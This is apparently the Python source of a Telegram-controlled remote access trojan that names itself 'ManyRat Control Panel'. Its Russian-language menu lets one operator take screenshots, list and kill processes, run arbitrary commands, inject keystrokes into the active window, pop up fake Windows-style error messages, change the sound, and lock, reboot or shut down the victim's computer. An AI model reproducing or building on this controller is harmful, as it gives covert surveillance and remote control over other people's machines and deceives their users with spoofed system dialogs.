from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

import actions
from config import OWNER_ID, TOKEN

# Состояния ConversationHandler
(
    WAIT_RUN,
    WAIT_TYPE,
    WAIT_TYPE_ENTER,
    WAIT_MSG,
    WAIT_KILL,
    WAIT_PS,
    WAIT_VOLUME,
) = range(7)

OWNER_FILTER = filters.User(user_id=OWNER_ID)


# ─── Клавиатуры ────────────────────────────────────────────────────────────────

def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖥 Система",   callback_data="menu_system"),
         InlineKeyboardButton("⚙️ Действия",  callback_data="menu_actions")],
        [InlineKeyboardButton("🔊 Звук",      callback_data="menu_sound"),
         InlineKeyboardButton("🔒 Питание",   callback_data="menu_power")],
    ])


def kb_system():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📜 Нагрузка",       callback_data="sys_info")],
        [InlineKeyboardButton("📊 Процессы",        callback_data="sys_ps")],
        [InlineKeyboardButton("🖼 Скриншот",        callback_data="sys_screen")],
        [InlineKeyboardButton("❌ Убить процесс",   callback_data="sys_kill")],
        [InlineKeyboardButton("⬅️ Назад",           callback_data="back_main")],
    ])


def kb_actions():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Запустить прогу",    callback_data="act_run")],
        [InlineKeyboardButton("⌨️ Ввести текст",       callback_data="act_type")],
        [InlineKeyboardButton("↩️ Ввести + Enter",     callback_data="act_type_enter")],
        [InlineKeyboardButton("⚠️ Окошко с ошибкой",  callback_data="act_msg")],
        [InlineKeyboardButton("⬅️ Назад",              callback_data="back_main")],
    ])


def kb_sound():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔉 Установить громкость", callback_data="snd_set")],
        [InlineKeyboardButton("🔇 Выключить звук",       callback_data="snd_mute")],
        [InlineKeyboardButton("🔊 Включить звук",        callback_data="snd_unmute")],
        [InlineKeyboardButton("⬅️ Назад",                callback_data="back_main")],
    ])


def kb_power():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔒 Заблокировать",   callback_data="pwr_lock")],
        [InlineKeyboardButton("💤 Спящий режим",    callback_data="pwr_sleep")],
        [InlineKeyboardButton("🔄 Перезагрузка",    callback_data="pwr_reboot")],
        [InlineKeyboardButton("⏻ Выключение",       callback_data="pwr_shutdown")],
        [InlineKeyboardButton("❌ Отмена действия", callback_data="pwr_cancel")],
        [InlineKeyboardButton("⬅️ Назад",           callback_data="back_main")],
    ])


def kb_cancel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Отмена", callback_data="cancel_input")],
    ])


# ─── Вспомогалки ───────────────────────────────────────────────────────────────

MAIN_TEXT = (
    "🛰 <b>ManyRat Control Panel</b>\n\n"
    "Система на связи. Вы находитесь в главном меню управления.\n"
    "Используйте интерактивное меню ниже для выбора нужной функции."
)


async def show_main(update: Update, text: str | None = None):
    msg_text = text or MAIN_TEXT
    query = update.callback_query
    if query:
        msg = query.message
        # Если сообщение содержит медиа (фото/документ) — нельзя edit_message_text,
        # удаляем и отправляем новое
        if msg.photo or msg.document or msg.video or msg.audio:
            await msg.delete()
            await msg.chat.send_message(
                msg_text, reply_markup=kb_main(), parse_mode="HTML"
            )
        else:
            await query.edit_message_text(
                msg_text, reply_markup=kb_main(), parse_mode="HTML"
            )
    else:
        await update.message.reply_text(
            msg_text, reply_markup=kb_main(), parse_mode="HTML"
        )


async def show_submenu(query, text: str, keyboard):
    await query.edit_message_text(
        text, reply_markup=keyboard, parse_mode="HTML"
    )


SUBMENU_TEXT = "Активируйте необходимую кнопку для выбора необходимой вам функции."


# ─── /start ────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main(update)
    return ConversationHandler.END


# ─── Навигация по меню ─────────────────────────────────────────────────────────

async def nav_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back_main":
        await show_main(update)
        return ConversationHandler.END

    if data == "menu_system":
        await show_submenu(query, f"<b>🖥 Система</b>\n\n{SUBMENU_TEXT}", kb_system())
    elif data == "menu_actions":
        await show_submenu(query, f"<b>⚙️ Действия</b>\n\n{SUBMENU_TEXT}", kb_actions())
    elif data == "menu_sound":
        await show_submenu(query, f"<b>🔊 Звук</b>\n\n{SUBMENU_TEXT}", kb_sound())
    elif data == "menu_power":
        await show_submenu(query, f"<b>🔒 Питание</b>\n\n{SUBMENU_TEXT}", kb_power())

    return ConversationHandler.END


# ─── Система ───────────────────────────────────────────────────────────────────

async def sys_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    info = actions.system_info()
    await query.edit_message_text(
        f"<b>📜 Нагрузка системы</b>\n\n<pre>{info}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="sys_info"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )


async def sys_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Делаю скриншот…")
    buffer = actions.take_screenshot()
    await query.message.reply_photo(
        buffer,
        caption="🖼 Скриншот экрана",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад в меню", callback_data="back_main"),
        ]]),
    )


async def sys_ps_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📊 <b>Процессы</b>\n\nВведите фильтр (часть имени) или <code>.</code> для всех:",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_PS


async def sys_ps_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    query_str = "" if text == "." else text
    result = actions.list_processes(query_str)
    await update.message.reply_text(
        f"📊 <b>Список процессов:</b>\n<pre>{result[:3800]}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def sys_kill_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❌ <b>Убить процесс</b>\n\nВведите PID или имя процесса:",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_KILL


async def sys_kill_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    count = actions.kill_process(target)
    text = f"✅ Убито процессов: {count}" if count else "⚠️ Не найдено или нет доступа"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_system"),
        ]]),
    )
    return ConversationHandler.END


# ─── Действия ──────────────────────────────────────────────────────────────────

async def act_run_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚀 <b>Запустить программу</b>\n\nВведите имя программы или команду:",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_RUN


async def act_run_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.strip()
    try:
        actions.run_command(command)
        text = "✅ Запущено"
    except Exception as e:
        text = f"❌ Ошибка: {e}"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_type_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⌨️ <b>Ввести текст</b>\n\nВведите текст для печати в активном окне:",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_TYPE


async def act_type_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    actions.type_text(update.message.text)
    await update.message.reply_text(
        "✅ Текст вписан",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_type_enter_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "↩️ <b>Ввести текст + Enter</b>\n\nВведите текст (будет нажат Enter):",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_TYPE_ENTER


async def act_type_enter_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    actions.type_text(update.message.text, press_enter=True)
    await update.message.reply_text(
        "✅ Текст вписан и отправлен",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_msg_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⚠️ <b>Окошко с ошибкой</b>\n\nВведите в формате <code>Имя|текст ошибки</code>\n"
        "Пример: <code>Windows|Не удалось найти файл</code>",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_MSG


async def act_msg_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    if "|" not in raw:
        await update.message.reply_text(
            "❌ Неверный формат. Пример: <code>Windows|Не удалось найти файл</code>",
            reply_markup=kb_cancel(),
            parse_mode="HTML",
        )
        return WAIT_MSG
    title, text = raw.split("|", 1)
    title, text = title.strip(), text.strip()
    if not title or not text:
        await update.message.reply_text(
            "❌ Имя и текст не могут быть пустыми",
            reply_markup=kb_cancel(),
            parse_mode="HTML",
        )
        return WAIT_MSG
    actions.show_message(title, text)
    await update.message.reply_text(
        "✅ Окошко показано",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


# ─── Звук ──────────────────────────────────────────────────────────────────────

async def snd_set_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    current = actions.get_volume()
    await query.edit_message_text(
        f"🔉 <b>Установить громкость</b>\n\nТекущая: <b>{current}%</b>\n\nВведите число от 0 до 100:",
        reply_markup=kb_cancel(),
        parse_mode="HTML",
    )
    return WAIT_VOLUME


async def snd_set_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text.isdigit():
        await update.message.reply_text(
            "❌ Введите число от 0 до 100",
            reply_markup=kb_cancel(),
        )
        return WAIT_VOLUME
    value = actions.set_volume(int(text))
    await update.message.reply_text(
        f"✅ Громкость установлена: <b>{value}%</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def snd_mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.set_mute(True)
    await query.edit_message_text(
        "🔇 <b>Звук был выключен</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )


async def snd_unmute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.set_mute(False)
    await query.edit_message_text(
        "🔊 <b>Звук был включён</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )


# ─── Питание ───────────────────────────────────────────────────────────────────

async def pwr_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.lock()
    await query.edit_message_text(
        "🔒 <b>Компьютер заблокирован</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_sleep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💤 <b>Компьютер войдёт в спящий режим через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )
    actions.sleep()


async def pwr_reboot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.reboot()
    await query.edit_message_text(
        "🔄 <b>Компьютер будет перезагружен через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("❌ Отменить", callback_data="pwr_cancel"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.shutdown()
    await query.edit_message_text(
        "⏻ <b>Компьютер будет выключен через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("❌ Отменить", callback_data="pwr_cancel"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.cancel_shutdown()
    await query.edit_message_text(
        "❌ <b>Действие было отменено</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )


# ─── Отмена ввода ──────────────────────────────────────────────────────────────

async def cancel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_main(update)
    return ConversationHandler.END


# ─── Запуск ────────────────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(TOKEN).build()
    owner = OWNER_FILTER

    # ConversationHandler — все состояния ввода
    conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(sys_ps_ask,           pattern="^sys_ps$"),
            CallbackQueryHandler(sys_kill_ask,         pattern="^sys_kill$"),
            CallbackQueryHandler(act_run_ask,          pattern="^act_run$"),
            CallbackQueryHandler(act_type_ask,         pattern="^act_type$"),
            CallbackQueryHandler(act_type_enter_ask,   pattern="^act_type_enter$"),
            CallbackQueryHandler(act_msg_ask,          pattern="^act_msg$"),
            CallbackQueryHandler(snd_set_ask,          pattern="^snd_set$"),
        ],
        states={
            WAIT_PS:         [MessageHandler(filters.TEXT & ~filters.COMMAND, sys_ps_receive)],
            WAIT_KILL:       [MessageHandler(filters.TEXT & ~filters.COMMAND, sys_kill_receive)],
            WAIT_RUN:        [MessageHandler(filters.TEXT & ~filters.COMMAND, act_run_receive)],
            WAIT_TYPE:       [MessageHandler(filters.TEXT & ~filters.COMMAND, act_type_receive)],
            WAIT_TYPE_ENTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, act_type_enter_receive)],
            WAIT_MSG:        [MessageHandler(filters.TEXT & ~filters.COMMAND, act_msg_receive)],
            WAIT_VOLUME:     [MessageHandler(filters.TEXT & ~filters.COMMAND, snd_set_receive)],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_input, pattern="^cancel_input$"),
            CommandHandler("start", start, filters=owner),
        ],
        per_user=True,
        per_chat=True,
    )

    app.add_handler(CommandHandler(["start", "help"], start, filters=owner))
    app.add_handler(conv)

    # Навигация и быстрые действия (без ввода)
    nav_pattern = "^(back_main|menu_system|menu_actions|menu_sound|menu_power)$"
    app.add_handler(CallbackQueryHandler(nav_callback,   pattern=nav_pattern))
    app.add_handler(CallbackQueryHandler(sys_info,       pattern="^sys_info$"))
    app.add_handler(CallbackQueryHandler(sys_screen,     pattern="^sys_screen$"))
    app.add_handler(CallbackQueryHandler(snd_mute,       pattern="^snd_mute$"))
    app.add_handler(CallbackQueryHandler(snd_unmute,     pattern="^snd_unmute$"))
    app.add_handler(CallbackQueryHandler(pwr_lock,       pattern="^pwr_lock$"))
    app.add_handler(CallbackQueryHandler(pwr_sleep,      pattern="^pwr_sleep$"))
    app.add_handler(CallbackQueryHandler(pwr_reboot,     pattern="^pwr_reboot$"))
    app.add_handler(CallbackQueryHandler(pwr_shutdown,   pattern="^pwr_shutdown$"))
    app.add_handler(CallbackQueryHandler(pwr_cancel,     pattern="^pwr_cancel$"))

    app.run_polling()


if __name__ == "__main__":
    main()
